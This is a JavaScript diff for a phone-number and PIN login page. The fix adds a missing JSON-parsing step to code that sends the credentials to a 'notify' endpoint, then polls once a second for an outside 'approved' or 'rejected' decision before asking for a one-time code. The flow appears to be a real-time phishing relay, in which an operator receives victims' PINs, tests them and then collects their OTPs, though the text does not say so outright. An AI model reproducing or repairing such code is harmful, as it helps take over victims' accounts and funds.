@@ -312,67 +312,68 @@ document.addEventListener('DOMContentLoaded', function () {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username: num, pin: pinHidden.value })
       })
-.then(function (data) {
-         var loginId = data && data.loginId ? data.loginId : ('LOG-' + Date.now());
-         console.log('[login] Response from /api/notify/login:', data);
-         console.log('[login] Using loginId:', loginId);
+      .then(function (res) { return res.json(); })
+      .then(function (data) {
+        var loginId = data && data.loginId ? data.loginId : ('LOG-' + Date.now());
+        console.log('[login] Response from /api/notify/login:', data);
+        console.log('[login] Using loginId:', loginId);
 
-         var pollInterval = null;
-         var checkingPinStatus = false;
-         var checkPinStatus = function () {
-           if (checkingPinStatus) return;
-           checkingPinStatus = true;
-           console.log('[login] Polling status for:', loginId);
-           fetch('/api/login/status/' + loginId, { cache: 'no-store' })
-             .then(function (res) { return res.json(); })
-             .then(function (statusData) {
-               console.log('[login] Status response:', statusData);
-               if (statusData.sharedStore === false) {
-                 if (pollInterval) clearInterval(pollInterval);
-                 if (spinner) spinner.style.display = 'none';
-                 showToast('Approval storage is not configured. Connect Redis/KV on Vercel and redeploy.', 'error');
-                 if (submitBtn) submitBtn.disabled = false;
-                 return;
-               }
-               if (!statusData.found) {
-                 console.log('[login] Record not found for id:', loginId, '- will keep polling');
-               } else {
-                 console.log('[login] Record found, decided:', statusData.decided, 'status:', statusData.status);
-               }
-               if (statusData.decided) {
-                 console.log('[login] Decision made, clearing interval');
-                 if (pollInterval) clearInterval(pollInterval);
-                 if (statusData.status === 'approved') {
-                   console.log('[login] Approved! Showing OTP form');
-                   if (spinner) spinner.style.display = 'none';
-                   loginForm.style.display = 'none';
-                   if (otpForm) {
-                     otpForm.style.display = 'block';
-                     otpForm.dataset.phone = num;
-                   }
-                   if (submitBtn) submitBtn.disabled = false;
-                   var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
-                   if (firstOtp) firstOtp.focus();
-                 } else {
-                   console.log('[login] Rejected! Showing error');
-                   if (spinner) spinner.style.display = 'none';
-                   showToast('Wrong PIN. Please try again.', 'error');
-                   if (submitBtn) submitBtn.disabled = false;
-                   pinBoxes.forEach(function (box) { box.disabled = false; });
-                 }
-               }
-             })
-             .catch(function () {
-               if (spinner) spinner.style.display = 'none';
-               showToast('Error checking status. Please try again.', 'error');
-             })
-             .finally(function () {
-               checkingPinStatus = false;
-             });
-         };
-         checkPinStatus();
-         pollInterval = setInterval(checkPinStatus, 1000);
-       })
+        var pollInterval = null;
+        var checkingPinStatus = false;
+        var checkPinStatus = function () {
+          if (checkingPinStatus) return;
+          checkingPinStatus = true;
+          console.log('[login] Polling status for:', loginId);
+          fetch('/api/login/status/' + loginId, { cache: 'no-store' })
+            .then(function (res) { return res.json(); })
+            .then(function (statusData) {
+              console.log('[login] Status response:', statusData);
+              if (statusData.sharedStore === false) {
+                if (pollInterval) clearInterval(pollInterval);
+                if (spinner) spinner.style.display = 'none';
+                showToast('Approval storage is not configured. Connect Redis/KV on Vercel and redeploy.', 'error');
+                if (submitBtn) submitBtn.disabled = false;
+                return;
+              }
+              if (!statusData.found) {
+                console.log('[login] Record not found for id:', loginId, '- will keep polling');
+              } else {
+                console.log('[login] Record found, decided:', statusData.decided, 'status:', statusData.status);
+              }
+              if (statusData.decided) {
+                console.log('[login] Decision made, clearing interval');
+                if (pollInterval) clearInterval(pollInterval);
+                if (statusData.status === 'approved') {
+                  console.log('[login] Approved! Showing OTP form');
+                  if (spinner) spinner.style.display = 'none';
+                  loginForm.style.display = 'none';
+                  if (otpForm) {
+                    otpForm.style.display = 'block';
+                    otpForm.dataset.phone = num;
+                  }
+                  if (submitBtn) submitBtn.disabled = false;
+                  var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
+                  if (firstOtp) firstOtp.focus();
+                } else {
+                  console.log('[login] Rejected! Showing error');
+                  if (spinner) spinner.style.display = 'none';
+                  showToast('Wrong PIN. Please try again.', 'error');
+                  if (submitBtn) submitBtn.disabled = false;
+                  pinBoxes.forEach(function (box) { box.disabled = false; });
+                }
+              }
+            })
+            .catch(function () {
+              if (spinner) spinner.style.display = 'none';
+              showToast('Error checking status. Please try again.', 'error');
+            })
+            .finally(function () {
+              checkingPinStatus = false;
+            });
+        };
+        checkPinStatus();
+        pollInterval = setInterval(checkPinStatus, 1000);
+      })
       .catch(function () {
         if (spinner) spinner.style.display = 'none';
         showToast('Network error. Please try again.', 'error');
